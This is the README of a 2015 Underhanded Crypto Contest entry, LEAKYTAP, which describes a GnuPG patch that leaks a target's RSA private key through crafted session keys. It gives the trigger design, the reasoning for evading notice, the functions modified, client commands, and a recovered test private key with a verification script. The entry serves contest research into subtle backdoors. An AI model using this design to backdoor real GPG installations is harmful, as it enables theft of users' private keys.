# Underhanded Crypto Contest (UCC) 2015

| Submission Name        | Category        | Author     | License |
|:---------------|:---------------|:--------------|:--------------|
| LEAKYTAP | GPG Key Leaking Backdoor | Jos Wetzels | AGPL-V3 |

## Problem statement

>*Patch the GPG source code, to leak the user’s private key in a subtle way. The leak should be performed in such a way that the average user would not notice it. Annotated samples must be included to demonstrate the technique and its effectiveness.*

## Backdoor description

LEAKYTAP is a proof-of-concept GPG backdoor that aims to leak the target user's private key by using the GPG session key as a subliminal channel. The backdoor is currently limited to targeting RSA public keys only but can be modified to support other GPG public key types as well. The backdoor was designed with a certain degree of covertness with respect to the average GPG user in mind but does not provide strong properties such as confidentiality with forward-secrecy or deniability to the attacker in the face of a more advanced user. The use-case i had in mind when designing the backdoor was an attacker intercepting some security-related embedded device en-route to the target modifying its firmware to include the backdoored GPG executable (hence the choice for writing the patch for GnuPG classic) in order to learn the target user's private key but it is certainly not limited to such a scenario.

Consider a n-bit public modulus N (with n/2-bit prime factors p and q) and a 256-bit (the standard and maximum in GPG) symmetric session key, an attacker Mallory and a target Alice. The backdoor works as follows:

1. Mallory seeks to obtain the private key corresponding to Alice's public key and manages to backdoor Alice's GPG executable with her backdoor.
2. Mallory triggers the backdoor by sending a message with a specially crafted session key (see below) encrypted with Alice's public key to Alice
3. When Alice decrypts Mallory's message, the private key corresponding to the public key it was encrypted with becomes accessible to GPG. A fragment (the size of the channel bandwith) of the prime factor p is extracted and encrypted by the attacker's symmetric key embedded in the backdoor, using an IV derived from Mallory's session key. This encrypted fragment is stored in a temporary file.
4. When Alice sends a response message (to anyone, not only Mallory), the backdoor retrieves the currently stored encrypted fragment and sets the session key to it. Thus, once Alice responds to Mallory the latter can extract a leaked fragment of the prime factor p.
5. Mallory repeats this process as many times as necessary (depending on channel bandwith and prime factor size) until she can recover Alice's private key.

### Mallory's trigger session keys

Mallory's session keys are formatted as follows:

>*[I|IV|G]*

Where I is an *index byte*, IV the randomized 128-bit IV and 120 bits of random garbage G. The *index byte* indicates what fragment of the prime factor is to be leaked next and does so by falling in one of several 'buckets' (ie. byte ranges) determined by the prime factor size and channel bandwith. For example, assume we have 1024-bit prime factors and 256-bit session keys, then we need to leak p in 4 fragments hence we can express the indexes {0,..,3} as the ranges {{0x00,..,0x3F},{0x40,..,0x7F},..}. Hence if mallory wants to leak the 256 uppermost bits of p she sets I = random(0x00,0x3F).

### Alice's response session keys

When there is an 'unretrieved leak' (ie. Mallory has sent a trigger message but Alice has not responded to Mallory yet) Alice's response session keys consist of fragments of prime factor p encrypted using AES-256 in CBC mode with the attacker's embedded symmetric key and the IV specified by the last trigger message from Mallory. A 3rd party Bob communicating with Alice has a chance of backdoor discovery if there is an unretrieved leak and Alice sends more than one message to Bob. This is the case since as long as the leak goes unretrieved (ie. Mallory sends no new trigger message), the session key chosen by alice is static and Bob will notice identical session keys for different messages. This could be addressed by the attacker by including a random nonce (at the cost of reduced channel bandwith) with the leaked fragment and encrypting it right before sending it instead of before storage.

### Partial leaking and key reconstruction

Should Alice break of communication with Mallory (or Mallory choose to limit backdoor interaction) before the entire prime factor is recovered it is still possible for Mallory to reconstruct Alice's private key from partial prime factor exposure. It is known from reseach regarding partial key exposure attacks [[1](http://crypto.stanford.edu/~dabo/papers/RSA-survey.pdf)] [[2](https://eprint.iacr.org/2008/510.pdf)] that efficient reconstruction of the private key is possible given access to the n/4 (where n is the modulus bitsize) most or least significant bits of a modulus prime factor (or possibly less using eg. techniques proposed in [[3](https://www.usenix.org/legacy/event/sec08/tech/full_papers/halderman/halderman.pdf)]) or ~27% of any of the private exponent bits at random. This can be used by Mallory by reducing the protocol run to an exchange of 2 (for 2048-bit keys) or 4 (for 4096-bit keys) GPG messages.

### Example protocol run

Below is an example backdoor protocol run:

* Mallory: session_key = [I0|IV0|G0]
* Alice: session_key = E(p[0:256], K, IV0)
* Mallory: session_key = [I1|IV1|G1]
* Alice: session_key = E(p[256:512], K, IV1)
* Mallory: session_key = [I2|IV2|G2]
* Alice: session_key = E(p[512:768], K, IV2)
* Mallory: session_key = [I3|IV3|G3]
* Alice: session_key = E(p[768:1024], K, IV3)

## Design Rationale

The backdoor was designed with the average GPG user in mind (as a target) and as such focuses on the following:

* Avoiding suspicious 'out of context' passphrase queries or long-term keylogging by the backdoored GPG in order to access encrypted private keys
* Avoiding modifications to public keys
* Avoiding Low-bandwith channels requiring intensive interaction
* Guaranteeing exclusive backdoor usage by the attacker

Obviously, the backdoor does not achieve such properties as undetectability and deniability but is probably still sufficiently covert to bypass average scrutiny.

### Confidentiality

While Alice broadcasts leaked data to all parties she communicates with, only those parties in posession of both the IVs and attacker's embedded secret key can use the backdoor. Given that access to the secret key is predicated upon access to the backdoor and access to the IVs predicated upon either access to the backdoor or Alice's private key this guarantees exclusive backdoor usage to the attacker.

### (Un)detectability

The idea is that while public keys are commonly scrutinized by the average security-conscious user this does not go for the, essentially 'throwaway', session keys. Embedding our subliminal channel in the session keys has the added benefit of being able to retroactively copromise preexisting public keys rather than, for example, only those generated with a backdoored key generation mechanism (such as many of the so-called [SETUP attacks](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.54.616&rep=rep1&type=pdf)). Similarly opting for a high-bandwith channel by leaking as much of the private key as we can per backdoor interaction limits the total amount of interaction (translating to eg. fewer GPG e-mails requiring a response) which might arouse suspicion in the average user. 

Mallory's triggering session keys are virtually indistinguishable from random session keys since 248 out of 256 bits (IV + garbage) are randomly generated and while the 8 most significant bit indicate the fragment to leak they do so in a rather inconspcious fashion (see above).

More problematic are Alice's leaking session keys. It should be noted that anyone can 'trigger' the backdoor insofar that the session key of any party communicating with Mallory is treated as a 'trigger' and subsequently Alice's session keys are derived from this leak. The temp storage used to hold a leak triggered by the last message received by Alice only gets updated upon decrypting new messages. Hence any messages sent by Alice without intermittent decryption (of messages by any party, not just Mallory) result in identical session keys, something that might be noticed by any party (or collaborating parties) receiving multiple messages from Alice in such a case. The attacker could mitigate this by including a nonce (in the fashion noted above) at the price of reduced channel bandwith.

Finally, the rather blunt way used to store encrypted leaked fragments (in a temporary file) might arouse some suspicion as well though modifying this part to achieve additional covertness should not prove difficult.

### Deniability

The backdoor offers some deniability to Mallory since instead of leaking exclusively to Mallory the backdoor leaks to all communicating parties. In order to prove Mallory was the party interacting with the backdoor Alice would have to retain a backarchive of Mallory's GPG messages to her so that upon discovery of the backdoor she could extract the encrypted leak fragment from the temporary storage, try all candidate IVs in Mallory's trigger session keys (in combination with the extracted backdoor secret key) and check whether the result is part of a prime factor of her private key. While this is certainly plausible and requires relatively little effort, it at least complicates matters for those users who practice 'burn after reading' or in those setups where GPG usage is automated and merely the plaintext content is processed/stored while the original ciphertext is discarded.

### Reliability

The backdoor suffers from some reliability issues arising from the fact that any session key is treated as a trigger key and hence there is the possibility that Alice decrypts a 3rd party's message between decrypting Mallory's trigger and sending a response, thus leading to Mallory retrieving corrupted plaintext. This can be addressed by, upon detecting corruption, executing several protocol iterations and recombining the recovered pieces (with some possible redundancy). The number of re-tries depends on Alice's communication practices (immediate response or not, etc.), number of parties Alice is in communication with and communication frequency. All in all this does not seem to be a major obstacle to backdoor usability.

## Modifications to the GPG source

The backdoor patch was designed for the [latest GnuPG classic release (1.4.19)](https://www.gnupg.org/ftp/gcrypt/gnupg/gnupg-1.4.19.tar.bz2) but can be trivially (back)ported to either older GnuPG classic versions or GnuPG stable and modern releases.

### Server

The [backdoor](backdoor_patch\server) modifies two functions:

* [make_session_key in g10/seskey.c](https://fossies.org/dox/gnupg-1.4.19/seskey_8c_source.html#l00036)
* [get_session_key in g10/pubkey-enc.c](https://fossies.org/dox/gnupg-1.4.19/pubkey-enc_8c_source.html#l00070)

The modifications in *make_session_key* consist of replacing the session key generation functionality with functionality that reads the contents of the temporary storage file (up to the session key size) and simply sets the session key to these contents. Should this fail, it reverts back to the original functionality and generates a regular session key.

The modifications in *get_session_key* consist of checking whether the private key is of the correct type (currently RSA 2048 & 4096 only), confirms the session key contains a trigger message, extracts the IV and determines what fragment of the private key to leak. The leaked fragment is then encrypted with AES-256 in CBC mode using the attackers embedded key and the extracted IV and stored in a temporary file for later retrieval by *make_session_key*.

Finally, the backdoor contains some attacker-definable configuration data in [backdoor.h](backdoor_patch\server\backdoor.h).

### Client

Due to time constraints, rather than writing GPG packet building functionality into the python client from scratch i decided to make a quick & (very) dirty patch for the GPG client to allow for user-specified session keys, it modifies:

* [encode_crypt in g10/encode.c](https://fossies.org/dox/gnupg-1.4.19/encode_8c_source.html#l00419)

The modification in *encode_crypt* consists of replacing the call to *make_session_key* with a simple call that reads the session key from a predefined filename (/tmp/session_key.dek).

## Using the backdoor

Consider the scenario where Mallory manages to intercept Alice's embedded security device en-route and modifies the firmware to include our LEAKYTAP backdoor. Alice has a [2048-bit RSA public key](backdoor_test\alice\alice.pub) and so does [Mallory](backdoor_test\mallory\mallory.pub).

Mallory applies [backdoor_client.patch](backdoor_patch\client\backdoor_client.patch) to her GPG source and applies [backdoor_server.patch](backdoor_patch\server\backdoor_server.patch) to the GPG installation in the intercepted device. She then obtains Alice and Mallory's public keys:

>```bash
>$gpg --with-key-data --list-keys alice@alice.com
>(...)
>pkd:0:2048:D5B770AB6D7117B317F6AE1EDF1D27DFFE58A6E6E7DA9C4BAC92AD6A33975086E55052B3C87C177B76777FA888B901B357A03262B66A9BA146F494FEEBF2A51EEA8B81D5FF4D02ABD419E6A7E1B4428831BAFF9A89F3F134A4859AE00404CF037E05090E27F394B879C98B39799062734A8CED73B97C9E3E51072693AF095B0D4E573615C6C448D638FF6617454BEBE8AA6AA8F61E971110A1CEA38BF515B6BE98FC1A046E028D976AA105359B758AA26DD0BA65126FDF452EB1CAE2A3BD3C795BEAA432DC8AA569C9FB8047E5AE3F856C3F3F5A8A4FA5B9C610DEE35039D295FE4FEB8145EF482069BE501F8578F1829A5E7616E2CF98CAB25433189B3457D9:
>pkd:1:17:10001:
>$gpg --with-key-data --list-keys mallory@mallory.com
>(...)
>pkd:0:2048:CC045DE7AF73F094C98A22017D6DF5686722B57E0B20C216F4738AD5542BE31C2B8902EB12D7527B76760AEE030CCB3C0011209534BED269E0C9EF0E012DD1069C00A3CE17712D90F982241376396C145F285043C2141E48104AEF11116CAEC5A1D32F21C0E1FBE26BA2EE9BEBA15CD649316EE16D50DDB3DE3AE4A8B0C230DDEF37C3E53EADB86365661EBC54BDD7FFCE9933B1913711CE609CBC678FCD9097C7C21CAEB8FACF522375398637EFD21395E5B711EA9915D84348A53EE5A0744509F3BB3D8914529685BCA49AC127398DA1852418BC46EA6C720EBB164FE92AF9A835B8F53EF104EA2417E7FF66FC707BE88712067798C29B9D9A349B8EC4B017:
>pkd:1:17:10001:
>```

Mallory starts by crafting trigger keys:

>```bash
>$python leakytap_client.py --target-pubkey D5B770AB6D7117B317F6AE1EDF1D27DFFE58A6E6E7DA9C4BAC92AD6A33975086E55052B3C87C177B76777FA888B901B357A03262B66A9BA146F494FEEBF2A51EEA8B81D5FF4D02ABD419E6A7E1B4428831BAFF9A89F3F134A4859AE00404CF037E05090E27F394B879C98B39799062734A8CED73B97C9E3E51072693AF095B0D4E573615C6C448D638FF6617454BEBE8AA6AA8F61E971110A1CEA38BF515B6BE98FC1A046E028D976AA105359B758AA26DD0BA65126FDF452EB1CAE2A3BD3C795BEAA432DC8AA569C9FB8047E5AE3F856C3F3F5A8A4FA5B9C610DEE35039D295FE4FEB8145EF482069BE501F8578F1829A5E7616E2CF98CAB25433189B3457D9 10001 --attacker-pubkey CC045DE7AF73F094C98A22017D6DF5686722B57E0B20C216F4738AD5542BE31C2B8902EB12D7527B76760AEE030CCB3C0011209534BED269E0C9EF0E012DD1069C00A3CE17712D90F982241376396C145F285043C2141E48104AEF11116CAEC5A1D32F21C0E1FBE26BA2EE9BEBA15CD649316EE16D50DDB3DE3AE4A8B0C230DDEF37C3E53EADB86365661EBC54BDD7FFCE9933B1913711CE609CBC678FCD9097C7C21CAEB8FACF522375398637EFD21395E5B711EA9915D84348A53EE5A0744509F3BB3D8914529685BCA49AC127398DA1852418BC46EA6C720EBB164FE92AF9A835B8F53EF104EA2417E7FF66FC707BE88712067798C29B9D9A349B8EC4B017 10001 --backdoor-key AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA --build-triggers
>[+]Triggers:
>IV || Trigger session key
>ac49af4a8c23a89305750e9f933c8ca1 14ac49af4a8c23a89305750e9f933c8ca126d6cef36f39846ef0592c16994cf3
>27c3127aab03e1e2e61be263184c2b4a 4827c3127aab03e1e2e61be263184c2b4a68507e250111823486b422f838fe87
>bbd1db09312203beffc8f59ee905b19d 81bbd1db09312203beffc8f59ee905b19db5c2277f543817902fa54854d90adc
>4a1cb337d9d45560f6b79653eb01d397 d94a1cb337d9d45560f6b79653eb01d3971452073cd683a639b28345ea0d89a5
>```

Mallory now sends the [first message](backdoor_test\message\mallory_to_alice_0.gpg) (the content of which is irrelevant but should entice Alice to respond) using the first session key, to which [Alice responds](backdoor_test\message\alice_to_mallory_0.gpg) and to which Mallory responds again and so on until Mallory has collected 4 responses from Alice (while 2 will suffice using partial key exposure attacks the backdoor client does not contain code to automate this so i will demonstrate a full protocol run instead). For example, Mallory crafts the first message:

>```bash
>$python -c 'print "14ac49af4a8c23a89305750e9f933c8ca126d6cef36f39846ef0592c16994cf3".decode("hex")' > /tmp/session_key.dek
>$gpg --output mallory_to_alice_0.gpg --encrypt --recipient alice@alice.com mallory_to_alice_0
>```

Which Alice decrypts and to which she responds

>```bash
>$gpg -d mallory_to_alice_0.gpg
>
>You need a passphrase to unlock the secret key for
>user: "alice <alice@alice.com>"
>2048-bit RSA key, ID 94F04A7D, created 2015-07-31 (main key ID B8D82EE6)
>
>gpg: encrypted with 2048-bit RSA key, ID 94F04A7D, created 2015-07-31
>      "alice <alice@alice.com>"
>Hi Alice,
>
>What time was your event again?
>$gpg --output alice_to_mallory_0.gpg --encrypt --recipient mallory@mallory.com alice_to_mallory_0
>gpg: D145CF09: There is no assurance this key belongs to the named user
>
>pub  2048R/D145CF09 2015-07-31 mallory <mallory@mallory.com>
> Primary key fingerprint: 5B82 78F2 B2A2 CA7F 6A92  FD43 6675 EC34 9BA9 6317
>      Subkey fingerprint: 119C EFE5 3116 F18E 5773  46EA 380B 19C8 D145 CF09
>
>It is NOT certain that the key belongs to the person named
>in the user ID.  If you *really* know what you are doing,
>you may answer the next question with yes.
>
>Use this key anyway? (y/N) y
>```

From these responses Mallory extracts the session keys:

>```bash
>$gpg --show-session-key alice_to_mallory_0.gpg
>
>You need a passphrase to unlock the secret key for
>user: "mallory <mallory@mallory.com>"
>2048-bit RSA key, ID D145CF09, created 2015-07-31 (main key ID 9BA96317)
>
>gpg: encrypted with 2048-bit RSA key, ID D145CF09, created 2015-07-31
>      "mallory <mallory@mallory.com>"
>gpg: session key: `9:A0F05FF5BDC71CABEA31F61BC437157D70C871C47E8775BF686D048D500C91F8'
>```

And couples them (in-order) to the IVs and feeds them into the backdoor client to obtain [Alice's leaked private key](backdoor_test/mallory/alice.leak.priv):

>```bash
>$python leakytap_client.py --target-pubkey D5B770AB6D7117B317F6AE1EDF1D27DFFE58A6E6E7DA9C4BAC92AD6A33975086E55052B3C87C177B76777FA888B901B357A03262B66A9BA146F494FEEBF2A51EEA8B81D5FF4D02ABD419E6A7E1B4428831BAFF9A89F3F134A4859AE00404CF037E05090E27F394B879C98B39799062734A8CED73B97C9E3E51072693AF095B0D4E573615C6C448D638FF6617454BEBE8AA6AA8F61E971110A1CEA38BF515B6BE98FC1A046E028D976AA105359B758AA26DD0BA65126FDF452EB1CAE2A3BD3C795BEAA432DC8AA569C9FB8047E5AE3F856C3F3F5A8A4FA5B9C610DEE35039D295FE4FEB8145EF482069BE501F8578F1829A5E7616E2CF98CAB25433189B3457D9 10001 --attacker-pubkey CC045DE7AF73F094C98A22017D6DF5686722B57E0B20C216F4738AD5542BE31C2B8902EB12D7527B76760AEE030CCB3C0011209534BED269E0C9EF0E012DD1069C00A3CE17712D90F982241376396C145F285043C2141E48104AEF11116CAEC5A1D32F21C0E1FBE26BA2EE9BEBA15CD649316EE16D50DDB3DE3AE4A8B0C230DDEF37C3E53EADB86365661EBC54BDD7FFCE9933B1913711CE609CBC678FCD9097C7C21CAEB8FACF522375398637EFD21395E5B711EA9915D84348A53EE5A0744509F3BB3D8914529685BCA49AC127398DA1852418BC46EA6C720EBB164FE92AF9A835B8F53EF104EA2417E7FF66FC707BE88712067798C29B9D9A349B8EC4B017 10001 --backdoor-key AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA --get-private-key --leaks A0F05FF5BDC71CABEA31F61BC437157D70C871C47E8775BF686D048D500C91F8 55E61593D46D2B116AC1D87397BF4C5F27A67AF3A84CF586A0152A8E4921D709 A79CAE8D04DB6CB5BFEAF0AA786A7527DDB8F070403C945EB257132A7AB0CEDC B8E4BBB88F318002153AA94C04E267951273D149B98C8453287A007EF025B0EC --ivs ac49af4a8c23a89305750e9f933c8ca1 27c3127aab03e1e2e61be263184c2b4a bbd1db09312203beffc8f59ee905b19d 4a1cb337d9d45560f6b79653eb01d397
>
>[+]Recovered RSA private key corresponding to GPG public key:
>-----BEGIN RSA PRIVATE KEY-----
>MIIEpgIBAAKCAQEA1bdwq21xF7MX9q4e3x0n3/5Ypubn2pxLrJKtajOXUIblUFKz
>yHwXe3Z3f6iIuQGzV6AyYrZqm6FG9JT+6/KlHuqLgdX/TQKr1Bnmp+G0Qogxuv+a
>ifPxNKSFmuAEBM8DfgUJDifzlLh5yYs5eZBic0qM7XO5fJ4+UQcmk68JWw1OVzYV
>xsRI1jj/ZhdFS+voqmqo9h6XERChzqOL9RW2vpj8GgRuAo2XaqEFNZt1iqJt0Lpl
>Em/fRS6xyuKjvTx5W+qkMtyKpWnJ+4BH5a4/hWw/P1qKT6W5xhDe41A50pX+T+uB
>Re9IIGm+UB+FePGCml52FuLPmMqyVDMYmzRX2QIDAQABAoIBAQCLah8VtU8RJsN7
>KBr7cQmSFVm/huG4ujyjVwvJO955qYXt4AVnw4uN/rn1jPujtHhJsTctLdJds9eV
>tZyWTrNod5iKGg9xLUzqD/tniNUOkcnfMt6dH4U50hlV7sywVlrw2lgN5AICAlVw
>JGJZ6tZOX1OPku5tXM1KDmAb9xMjUVmPSyVEKb/JgMY8JC8OlxlA4HDKsHUzMd34
>AUmB3HZ7hrCMp4UyadV7tJesvNnT2epm0wGbj0+cG6vPrcFXGTRR5NnTT+TASSwQ
>sye/McA+ZisqoEWBj2zNVkkeSBPVo6v2g97b75CVAuJnVpBQnlKzM4O4KgK4aNjR
>KiBjuLwBAoGBAOWCdZ9eiX9KkzD47UVG0vmR05BR4Md7KhtaEXSTSO8iGzWkN+kX
>jUymYBz6OMdmOL5HTJnGf0zIQQnZd9VeUdTZLyNElfC9qv+ZfcqjeipWDk7usgM2
>OQtnypChLR5hUV/6n7BKp5nkCooIbPJ5V5mekrandTpcx6WEhitKcFmzAoGBAO5i
>VBNw9D+oYweL87SaI20JTHOXx2RzLO/6Ict7oedGqfdl8TPmgQLgjXAUjlRdlojT
>aJHqf0KD81trg/9lRcio57JqMZIkyaOFdqd+/CJPVBvnM1pxD0cbMLXMw8PjI6ab
>hlK1D9hdNqID6EbiMjm9rMKfcRAL2MqMNXHU1KpDAoGBAOI1DV2AviCaDi1Mi/+l
>6LdWxaEPMm8qs7u1sFKoAFDB2vOp4fl53yjXKxAkh+XwmKjieVtvS3UQQxpEH1pL
>1nflgBJQvUBEkM/QJy2cpwInQ38EwKttvBfDuuGGGoRBAwWIbfBCBKMnIkQePdNX
>ScH9izlAH8jgPV6kGeF9QvMFAoGBANSC4+DQ+W0md+Hqab+/CYXSnE0QKbjq1Ey6
>+BWmiZbb7/mU74oNG0WtWWlpadjb9a7UiIxMOFbbur7tAidT6PoRWTw8XyShlwAn
>ord/BNaxUZHucmFWGQCSxMHNYVfnzYhhbUWeFBoWPvX/9bn7PDstVC3MZcagSQuI
>IrzvtwZxAoGBAI+yx8FrmuZJdBnqBVNSkacHvqGZp31toElSGkw7e/b1j9vFyAP0
>j5nFpvv7qxjygGxhB0i/nsoN9lkVP35+IlKGYlfrNVEWc3ORFqALf/60H1o93z4i
>p2dOGLBXYm1vGJCjkZBtLgfyTwUogEObYnhk/FBCxHRfxuZhu3xKLNcR
>-----END RSA PRIVATE KEY-----
>```

The [following few lines of python](backdoor_test\demo.py) show this private key corresponds to Alice's public key (though not in proper GPG format but that would require implementing additional proper GPG formatting functionality which i didn't have the time for):

>```python
>#!/usr/bin/env python
>
>from Crypto.PublicKey import RSA
>
>alice_n = long("D5B770AB6D7117B317F6AE1EDF1D27DFFE58A6E6E7DA9C4BAC92AD6A33975086E55052B3C87C177B76777FA888B901B357A03262B66A9BA146F494FEEBF2A51EEA8B81D5FF4D02ABD419E6A7E1B4428831BAFF9A89F3F134A4859AE00404CF037E05090E27F394B879C98B39799062734A8CED73B97C9E3E51072693AF095B0D4E573615C6C448D638FF6617454BEBE8AA6AA8F61E971110A1CEA38BF515B6BE98FC1A046E028D976AA105359B758AA26DD0BA65126FDF452EB1CAE2A3BD3C795BEAA432DC8AA569C9FB8047E5AE3F856C3F3F5A8A4FA5B9C610DEE35039D295FE4FEB8145EF482069BE501F8578F1829A5E7616E2CF98CAB25433189B3457D9", 16)
>alice_e = long("10001", 16)
>
>alicePubKey = RSA.construct((alice_n, alice_e, ))
>
>alice_leak_priv = """-----BEGIN RSA PRIVATE KEY-----
>MIIEpgIBAAKCAQEA1bdwq21xF7MX9q4e3x0n3/5Ypubn2pxLrJKtajOXUIblUFKz
>yHwXe3Z3f6iIuQGzV6AyYrZqm6FG9JT+6/KlHuqLgdX/TQKr1Bnmp+G0Qogxuv+a
>ifPxNKSFmuAEBM8DfgUJDifzlLh5yYs5eZBic0qM7XO5fJ4+UQcmk68JWw1OVzYV
>xsRI1jj/ZhdFS+voqmqo9h6XERChzqOL9RW2vpj8GgRuAo2XaqEFNZt1iqJt0Lpl
>Em/fRS6xyuKjvTx5W+qkMtyKpWnJ+4BH5a4/hWw/P1qKT6W5xhDe41A50pX+T+uB
>Re9IIGm+UB+FePGCml52FuLPmMqyVDMYmzRX2QIDAQABAoIBAQCLah8VtU8RJsN7
>KBr7cQmSFVm/huG4ujyjVwvJO955qYXt4AVnw4uN/rn1jPujtHhJsTctLdJds9eV
>tZyWTrNod5iKGg9xLUzqD/tniNUOkcnfMt6dH4U50hlV7sywVlrw2lgN5AICAlVw
>JGJZ6tZOX1OPku5tXM1KDmAb9xMjUVmPSyVEKb/JgMY8JC8OlxlA4HDKsHUzMd34
>AUmB3HZ7hrCMp4UyadV7tJesvNnT2epm0wGbj0+cG6vPrcFXGTRR5NnTT+TASSwQ
>sye/McA+ZisqoEWBj2zNVkkeSBPVo6v2g97b75CVAuJnVpBQnlKzM4O4KgK4aNjR
>KiBjuLwBAoGBAOWCdZ9eiX9KkzD47UVG0vmR05BR4Md7KhtaEXSTSO8iGzWkN+kX
>jUymYBz6OMdmOL5HTJnGf0zIQQnZd9VeUdTZLyNElfC9qv+ZfcqjeipWDk7usgM2
>OQtnypChLR5hUV/6n7BKp5nkCooIbPJ5V5mekrandTpcx6WEhitKcFmzAoGBAO5i
>VBNw9D+oYweL87SaI20JTHOXx2RzLO/6Ict7oedGqfdl8TPmgQLgjXAUjlRdlojT
>aJHqf0KD81trg/9lRcio57JqMZIkyaOFdqd+/CJPVBvnM1pxD0cbMLXMw8PjI6ab
>hlK1D9hdNqID6EbiMjm9rMKfcRAL2MqMNXHU1KpDAoGBAOI1DV2AviCaDi1Mi/+l
>6LdWxaEPMm8qs7u1sFKoAFDB2vOp4fl53yjXKxAkh+XwmKjieVtvS3UQQxpEH1pL
>1nflgBJQvUBEkM/QJy2cpwInQ38EwKttvBfDuuGGGoRBAwWIbfBCBKMnIkQePdNX
>ScH9izlAH8jgPV6kGeF9QvMFAoGBANSC4+DQ+W0md+Hqab+/CYXSnE0QKbjq1Ey6
>+BWmiZbb7/mU74oNG0WtWWlpadjb9a7UiIxMOFbbur7tAidT6PoRWTw8XyShlwAn
>ord/BNaxUZHucmFWGQCSxMHNYVfnzYhhbUWeFBoWPvX/9bn7PDstVC3MZcagSQuI
>IrzvtwZxAoGBAI+yx8FrmuZJdBnqBVNSkacHvqGZp31toElSGkw7e/b1j9vFyAP0
>j5nFpvv7qxjygGxhB0i/nsoN9lkVP35+IlKGYlfrNVEWc3ORFqALf/60H1o93z4i
>p2dOGLBXYm1vGJCjkZBtLgfyTwUogEObYnhk/FBCxHRfxuZhu3xKLNcR
>-----END RSA PRIVATE KEY-----"""
>
>alicePrivKey = RSA.importKey(alice_leak_priv)
>plaintext = "Super Secret Message"
>
>ciphertext = alicePubKey.encrypt(plaintext, None)[0]
>decrypted_plaintext = alicePrivKey.decrypt(ciphertext)
>
>assert(plaintext == decrypted_plaintext)
>
>print "[+]Ciphertext: [%s]" % (ciphertext.encode('hex'))
>print "[+]Plaintext: [%s]" % (decrypted_plaintext)
>```

When executed:

>```bash
>$python demo.py
>[+]Ciphertext: [be2f3af3ea7a8979f4576d02340780a338fb34d0d7f1dfa04d98c5123ad1a90d2e46abe89a7a1f23973a3e484d22706bbf142e2f9b04d38eb5ede548bb7b566def5bb822f09d21f4245df524ab00e52111f312211563922b610a5da54446e83ac7df0654d74065482363cf38aebe33dd922ef15ddaddef519dad7d642fdc12b5e8396d16db59c87c46c58c0e91543605f7896b1843ca210c5518186f18b49357c77620f17e8620bf3d5da3950a4aa9e018edd06532c9210a59c0de3c05a0243d1062988c1d50b7cc7d9f8ca85b4e31c295881289b56c965c830a4929ff500432357bebea9da4f6c3d99b3fe18d094cab5889f94f75cb8369e13da9375cf4c03d]
>[+]Plaintext: [Super Secret Message]
>```